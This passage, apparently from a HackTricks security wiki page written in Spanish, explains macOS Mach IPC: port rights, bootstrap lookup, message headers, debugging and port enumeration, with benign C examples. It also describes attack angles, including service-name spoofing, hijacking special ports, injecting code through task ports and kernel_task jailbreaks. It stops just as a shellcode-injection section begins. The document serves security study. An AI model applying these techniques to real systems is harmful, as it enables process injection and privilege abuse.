# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Información básica

Mach utiliza **tasks** como la **unidad más pequeña** para compartir recursos, y cada task puede contener **múltiples threads**. Estas **tasks y threads están mapeadas 1:1 a procesos y threads POSIX**.

La comunicación entre tasks ocurre mediante Mach Inter-Process Communication (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre ports**, que funcionan como **colas de mensajes** gestionadas por el kernel.

Un **port** es el elemento **básico** de Mach IPC. Puede utilizarse para **enviar mensajes y recibirlos**.

Cada proceso tiene una **tabla IPC**, en la que es posible encontrar los **mach ports del proceso**. El nombre de un mach port es en realidad un número (un puntero al objeto del kernel).

Un proceso también puede enviar un nombre de port con algunos derechos **a una task diferente**, y el kernel hará que esta entrada aparezca en la **tabla IPC de la otra task**.

### Port Rights

Los port rights, que definen qué operaciones puede realizar una task, son fundamentales para esta comunicación. Los posibles **port rights** son ([definiciones disponibles aquí](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, que permite recibir mensajes enviados al port. Los Mach ports son colas MPSC (multiple-producer, single-consumer), lo que significa que solo puede existir **un receive right para cada port** en todo el sistema (a diferencia de las pipes, donde varios procesos pueden tener descriptores de archivo para el extremo de lectura de una misma pipe).
- Una **task con el Receive** right puede recibir mensajes y **crear Send rights**, lo que le permite enviar mensajes. Originalmente, solo la **task propietaria tiene el Receive right sobre su port**.
- Si el propietario del Receive right **muere** o lo elimina, el **send right deja de ser útil (dead name)**.
- **Send right**, que permite enviar mensajes al port.
- El Send right puede **clonarse**, de modo que una task que posee un Send right puede clonar el derecho y **concedérselo a una tercera task**.
- Ten en cuenta que los **port rights** también pueden **pasarse** mediante mensajes Mach.
- **Send-once right**, que permite enviar un mensaje al port y después desaparece.
- Este right **no puede** **clonarse**, pero sí puede **moverse**.
- **Port set right**, que representa un _port set_ en lugar de un único port. Extraer un mensaje de un port set extrae un mensaje de uno de los ports que contiene. Los port sets pueden utilizarse para escuchar en varios ports simultáneamente, de forma muy similar a `select`/`poll`/`epoll`/`kqueue` en Unix.
- **Dead name**, que no es un port right real, sino simplemente un marcador de posición. Cuando se destruye un port, todos los port rights existentes sobre el port se convierten en dead names.

**Las tasks pueden transferir SEND rights a otras**, permitiéndoles enviar mensajes de vuelta. **Los SEND rights también pueden clonarse, por lo que una task puede duplicar el derecho y entregárselo a una tercera task**. Esto, combinado con un proceso intermediario conocido como el **bootstrap server**, permite una comunicación eficaz entre tasks.

### File Ports

Los file ports permiten encapsular descriptores de archivo en Mach ports (utilizando Mach port rights). Es posible crear un `fileport` a partir de un descriptor de archivo determinado con `fileport_makeport`, y crear un descriptor de archivo a partir de un `fileport` con `fileport_makefd`.

### Establecimiento de una comunicación

Como se ha mencionado anteriormente, es posible enviar rights mediante mensajes Mach; sin embargo, **no se puede enviar un right sin tener ya un right** para enviar un mensaje Mach. Entonces, ¿cómo se establece la primera comunicación?

Para ello interviene el **bootstrap server** (**launchd** en macOS), ya que **cualquiera puede obtener un SEND right al bootstrap server**. Por tanto, es posible solicitarle un right para enviar un mensaje a otro proceso:

1. La task **A** crea un **nuevo port**, obteniendo el **RECEIVE right** sobre él.
2. La task **A**, al ser la titular del RECEIVE right, **genera un SEND right para el port**.
3. La task **A** establece una **conexión** con el **bootstrap server** y **le envía el SEND right** del port que generó al principio.
- Recuerda que cualquiera puede obtener un SEND right al bootstrap server.
4. La task A envía un mensaje `bootstrap_register` al bootstrap server para **asociar el port proporcionado con un nombre** como `com.apple.taska`.
5. La task **B** interactúa con el **bootstrap server** para realizar un **lookup** bootstrap del nombre del servicio (`bootstrap_lookup`). Para que el bootstrap server pueda responder, la task B le enviará un **SEND right a un port que creó previamente** dentro del mensaje de lookup. Si el lookup tiene éxito, el **server duplica el SEND right** recibido de la task A y **lo transmite a la task B**.
- Recuerda que cualquiera puede obtener un SEND right al bootstrap server.
6. Con este SEND right, la **task B** puede **enviar** un **mensaje** **a la task A**.
7. Para una comunicación bidireccional, normalmente la task **B** genera un nuevo port con un **RECEIVE** right y un **SEND** right, y entrega el **SEND right a la task A** para que pueda enviar mensajes a la TASK B (comunicación bidireccional).

El bootstrap server **no puede autenticar** el nombre del servicio declarado por una task. Esto significa que una **task** podría potencialmente **suplantar cualquier task del sistema**, por ejemplo, **declarando falsamente el nombre de un servicio de autorización** y aprobando después todas las solicitudes.

A continuación, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios **protegidos por SIP**: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto con cada nombre de servicio, también se almacena el **binario asociado**. El bootstrap server creará y conservará un **RECEIVE right para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos, el proceso de **lookup** difiere ligeramente. Cuando se realiza el lookup de un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:

- La task **B** inicia un **lookup** bootstrap de un nombre de servicio.
- **launchd** comprueba si la task está en ejecución y, si no lo está, la **inicia**.
- La task **A** (el servicio) realiza un **bootstrap check-in** (`bootstrap_check_in()`). Aquí, el servidor **bootstrap** crea un SEND right, lo conserva y **transfiere el RECEIVE right a la task A**.
- launchd duplica el **SEND right y lo envía a la task B**.
- La task **B** genera un nuevo port con un **RECEIVE** right y un **SEND** right, y entrega el **SEND right a la task A** (el svc) para que pueda enviar mensajes a la TASK B (comunicación bidireccional).

Sin embargo, este proceso solo se aplica a las tasks predefinidas del sistema. Las tasks que no son del sistema siguen funcionando como se ha descrito originalmente, lo que podría permitir una suplantación.

> [!CAUTION]
> Por lo tanto, launchd nunca debería fallar, ya que de lo contrario todo el sistema fallaría.

### Un mensaje Mach

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

La función `mach_msg`, esencialmente una llamada al sistema, se utiliza para enviar y recibir mensajes Mach. La función requiere que el mensaje que se enviará sea el primer argumento. Este mensaje debe comenzar con una estructura `mach_msg_header_t`, seguida del contenido real del mensaje. La estructura se define de la siguiente manera:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Los procesos que poseen un _**receive right**_ pueden recibir mensajes en un puerto Mach. Por el contrario, los **senders** reciben un _**send**_ o un _**send-once right**_. El send-once right se utiliza exclusivamente para enviar un único mensaje, después de lo cual deja de ser válido.<sup>[[11]](#references)</sup>

El campo inicial **`msgh_bits`** es un bitmap:

- El primer bit (el más significativo) se utiliza para indicar que un mensaje es complejo (más información abajo)
- El 3.º y el 4.º son utilizados por el kernel
- Los **5 bits menos significativos del 2.º byte** pueden utilizarse para **voucher**: otro tipo de puerto para enviar combinaciones de clave/valor.
- Los **5 bits menos significativos del 3.º byte** pueden utilizarse para **local port**
- Los **5 bits menos significativos del 4.º byte** pueden utilizarse para **remote port**

Los tipos que pueden especificarse en los puertos voucher, local y remote son (de [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Por ejemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` puede utilizarse para **indicar** que se debe derivar y transferir un **send-once** **right** para este port. También se puede especificar `MACH_PORT_NULL` para impedir que el receptor pueda responder.

Para lograr una **comunicación bidireccional** sencilla, un proceso puede especificar un **mach port** en la **cabecera del mensaje** mach, denominado _reply port_ (**`msgh_local_port`**), desde el cual el **receptor** del mensaje puede **enviar una respuesta** a este mensaje.

> [!TIP]
> Ten en cuenta que este tipo de comunicación bidireccional se utiliza en mensajes XPC que esperan una respuesta (`xpc_connection_send_message_with_reply` y `xpc_connection_send_message_with_reply_sync`). Sin embargo, **normalmente se crean ports diferentes**, como se explicó anteriormente, para crear la comunicación bidireccional.

Los demás campos de la cabecera del mensaje son:

- `msgh_size`: el tamaño del paquete completo.
- `msgh_remote_port`: el port al que se envía este mensaje.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: el ID de este mensaje, que interpreta el receptor.

> [!CAUTION]
> Ten en cuenta que **los mensajes mach se envían a través de un `mach port`**, que es un canal de comunicación de **un solo receptor y múltiples emisores** integrado en el kernel mach. **Varios procesos** pueden **enviar mensajes** a un mach port, pero en cualquier momento solo **un único proceso puede leer** de él.

Los mensajes se forman mediante la cabecera **`mach_msg_header_t`**, seguida del **cuerpo** y del **trailer** (si existe), y pueden conceder permiso para responder a ellos. En estos casos, el kernel solo necesita pasar el mensaje de una task a otra.

Un **trailer** es **información añadida al mensaje por el kernel** (el usuario no puede establecerla), que puede solicitarse al recibir el mensaje mediante los flags `MACH_RCV_TRAILER_<trailer_opt>` (se puede solicitar información diferente).

#### Mensajes complejos

Sin embargo, existen otros mensajes más **complejos**, como los que pasan derechos de port adicionales o comparten memoria, en los que el kernel también necesita enviar estos objetos al receptor. En estos casos, se establece el bit más significativo de la cabecera `msgh_bits`.

Los posibles descriptores que se pueden pasar están definidos en [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32 bits, todos los descriptores tienen 12B y el tipo de descriptor se encuentra en el undécimo. En 64 bits, los tamaños varían.

> [!CAUTION]
> El kernel copiará los descriptores de una tarea a otra, pero primero **creará una copia en la memoria del kernel**. Esta técnica, conocida como "Feng Shui", se ha abusado en varios exploits para hacer que el **kernel copie datos en su memoria**, haciendo que un proceso se envíe descriptores a sí mismo. Después, el proceso puede recibir los mensajes (el kernel los liberará).
>
> También es posible **enviar derechos de puerto a un proceso vulnerable**, y los derechos de puerto simplemente aparecerán en el proceso (incluso si no los está gestionando).

### Mac Ports APIs

Ten en cuenta que los puertos están asociados al espacio de nombres de la tarea, por lo que, para crear o buscar un puerto, también se consulta el espacio de nombres de la tarea (más información en `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Crear** un puerto.
- `mach_port_allocate` también puede crear un **port set**: un derecho de recepción sobre un grupo de puertos. Cada vez que se recibe un mensaje, se indica el puerto del que procede.
- `mach_port_allocate_name`: Cambiar el nombre del puerto (por defecto, un entero de 32 bits)
- `mach_port_names`: Obtener los nombres de los puertos de un objetivo
- `mach_port_type`: Obtener los derechos de una tarea sobre un nombre
- `mach_port_rename`: Cambiar el nombre de un puerto (como dup2 para FDs)
- `mach_port_allocate`: Asignar un nuevo RECEIVE, PORT_SET o DEAD_NAME
- `mach_port_insert_right`: Crear un nuevo derecho en un puerto en el que tienes RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funciones utilizadas para **enviar y recibir mensajes mach**. La versión overwrite permite especificar un búfer diferente para la recepción del mensaje (la otra versión simplemente lo reutilizará).

### Debug mach_msg

Como las funciones **`mach_msg`** y **`mach_msg_overwrite`** son las utilizadas para enviar y recibir mensajes, establecer un breakpoint en ellas permitiría inspeccionar los mensajes enviados y recibidos.

Por ejemplo, empieza a depurar cualquier aplicación que puedas depurar, ya que cargará **`libSystem.B`, que utilizará esta función**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Para obtener los argumentos de **`mach_msg`**, comprueba los registros. Estos son los argumentos (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtén los valores de los registros:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspecciona el encabezado del mensaje comprobando el primer argumento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ese tipo de `mach_msg_bits_t` es muy común para permitir una respuesta.

### Enumerar puertos
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
El **name** es el nombre predeterminado asignado al puerto (comprueba cómo va **aumentando** en los primeros 3 bytes). El **`ipc-object`** es el **identificador** único **ofuscado** del puerto.\
Observa también cómo los puertos que solo tienen el derecho **`send`** **identifican al propietario** (nombre del puerto + pid).\
Observa también el uso de **`+`** para indicar **otras tasks conectadas al mismo puerto**.

También es posible usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver también los **nombres de servicio registrados** (con SIP deshabilitado debido a la necesidad de `com.apple.system-task-port`):
```
procesp 1 ports
```
Puedes instalar esta herramienta en iOS descargándola desde [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Ejemplo de código

Observa cómo el **remitente** **asigna** un puerto, crea un **send right** para el nombre `org.darlinghq.example` y lo envía al **bootstrap server**, mientras que el remitente solicita el **send right** de ese nombre y lo utiliza para **enviar un mensaje**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Puertos privilegiados

Algunos puertos especiales permiten que una tarea **realice determinadas acciones sensibles o acceda a determinados datos sensibles** cuando tiene derechos **SEND** sobre ellos. Estos puertos son interesantes desde la perspectiva de un atacante tanto por sus capacidades como por la posibilidad de **compartir derechos SEND entre tareas**.

### Puertos especiales del host

Estos puertos están representados por un número.

Los derechos **SEND** pueden obtenerse llamando a **`host_get_special_port`** y los derechos **RECEIVE** llamando a **`host_set_special_port`**. Sin embargo, ambas llamadas requieren el puerto **`host_priv`**, al que solo puede acceder root. Además, anteriormente root podía llamar a **`host_set_special_port`** y secuestrar puertos arbitrarios, lo que permitía, por ejemplo, omitir las firmas de código secuestrando `HOST_KEXTD_PORT` (SIP lo impide actualmente).

Se dividen en 2 grupos: los **primeros 7 puertos son propiedad del kernel**: el 1 es `HOST_PORT`, el 2 es `HOST_PRIV_PORT`, el 3 es `HOST_IO_MASTER_PORT` y el 7 es `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Los que comienzan **a partir del** número **8** son **propiedad de system daemons** y pueden encontrarse declarados en [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Puerto del host**: Si un proceso tiene privilegios **SEND** sobre este puerto, puede obtener **información** sobre el **sistema** llamando a sus rutinas, como:
- `host_processor_info`: Obtener información del procesador
- `host_info`: Obtener información del host
- `host_virtual_physical_table_info`: Tabla de páginas virtuales/físicas (requiere MACH_VMDEBUG)
- `host_statistics`: Obtener estadísticas del host
- `mach_memory_info`: Obtener el diseño de la memoria del kernel
- **Puerto Host Priv**: Un proceso con derechos **SEND** sobre este puerto puede realizar **acciones privilegiadas**, como mostrar datos de arranque o intentar cargar una extensión del kernel. El **proceso debe ser root** para obtener este permiso.
- Además, para llamar a la API **`kext_request`**, se necesitan otros entitlements **`com.apple.private.kext*`**, que solo se conceden a binarios de Apple.
- Otras rutinas que pueden llamarse son:
- `host_get_boot_info`: Obtener `machine_boot_info()`
- `host_priv_statistics`: Obtener estadísticas privilegiadas
- `vm_allocate_cpm`: Asignar memoria física contigua
- `host_processors`: Derecho SEND a los procesadores del host
- `mach_vm_wire`: Hacer que la memoria sea residente
- Como **root** puede acceder a este permiso, podría llamar a `host_set_[special/exception]_port[s]` para **secuestrar puertos especiales o de excepción del host**.

Es posible **ver todos los puertos especiales del host** ejecutando:
```bash
procexp all ports | grep "HSP"
```
### Puertos especiales de task

Estos son puertos reservados para servicios conocidos. Es posible obtenerlos/establecerlos llamando a `task_[get/set]_special_port`. Se encuentran en `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [aquí](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: El port utilizado para controlar esta task. Se usa para enviar mensajes que afectan a la task. Este es el port devuelto por **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: El bootstrap port de la task. Se usa para enviar mensajes que solicitan los ports de otros servicios del sistema.
- **TASK_HOST_NAME_PORT**\[host-self send right]: El port utilizado para solicitar información sobre el host contenedor. Este es el port devuelto por **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: El port que identifica el origen del que esta task obtiene su memoria wired del kernel.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: El port que identifica el origen del que esta task obtiene su memoria gestionada predeterminada.

### Task Ports

Originalmente, Mach no tenía "processes", sino "tasks", que se consideraban más bien un contenedor de threads. Cuando Mach se fusionó con BSD, **cada task se correlacionó con un proceso BSD**. Por lo tanto, cada proceso BSD tiene los detalles necesarios para ser un proceso y cada task de Mach también tiene sus mecanismos internos (excepto el inexistente pid 0, que es `kernel_task`).

Hay dos funciones muy interesantes relacionadas con esto:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtiene un SEND right para la task relacionada con el `pid` especificado y se lo entrega al `target_task_port` indicado (que normalmente es la task del caller que ha utilizado `mach_task_self()`, pero podría ser un SEND port sobre una task diferente).
- `pid_for_task(task, &pid)`: Dado un SEND right a una task, encuentra con qué PID está relacionada esa task.

Para realizar acciones dentro de la task, esta necesitaba un `SEND` right sobre sí misma llamando a `mach_task_self()` (que utiliza `task_self_trap` (28)). Con este permiso, una task puede realizar varias acciones, como:

- `task_threads`: Obtiene un SEND right sobre todos los task ports de los threads de la task.
- `task_info`: Obtiene información sobre una task.
- `task_suspend/resume`: Suspende o reanuda una task.
- `task_[get/set]_special_port`
- `thread_create`: Crea un thread.
- `task_[get/set]_state`: Controla el estado de una task.
- y se pueden encontrar más en [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Ten en cuenta que con un SEND right sobre el task port de una **task diferente**, es posible realizar estas acciones sobre otra task.

Además, el task port también es el port **`vm_map`**, que permite a un caller **leer y manipular la memoria** dentro de una task con funciones como `vm_read()` y `vm_write()`. Esto significa que una task con SEND rights sobre el task port de otra task puede **inyectar código en esa task**.

Recuerda que, dado que el **kernel también es una task**, si alguien consigue obtener **SEND permissions** sobre **`kernel_task`**, podrá hacer que el kernel ejecute cualquier cosa (jailbreaks).

- Llama a `mach_task_self()` para **obtener el name** de este port para la task del caller. Este port solo se **hereda** a través de **`exec()`**; una nueva task creada con `fork()` obtiene un nuevo task port (como caso especial, una task también obtiene un nuevo task port después de `exec()` en un binario suid). La única forma de generar una task y obtener su port es realizar el ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) durante un `fork()`.
- Estas son las restricciones para acceder al port (de `macos_task_policy` del binario `AppleMobileFileIntegrity`):
- Si la app tiene el **`com.apple.security.get-task-allow` entitlement**, los procesos del **mismo usuario pueden acceder al task port** (normalmente añadido por Xcode para debugging). El proceso de **notarization** no lo permitirá en releases de producción.
- Las apps con el entitlement **`com.apple.system-task-ports`** pueden obtener el **task port de cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se concede a aplicaciones de Apple.
- **Root puede acceder a los task ports** de aplicaciones **no** compiladas con un runtime **hardened** (y que no sean de Apple).

**The task name port:** Una versión no privilegiada del _task port_. Hace referencia a la task, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.

### Thread Ports

Los threads también tienen ports asociados, que son visibles desde la task que llama a **`task_threads`** y desde el procesador mediante `processor_set_threads`. Un SEND right sobre el thread port permite utilizar la función del subsistema `thread_act`, como:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Cualquier thread puede obtener este port llamando a **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Puedes obtener un shellcode de:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
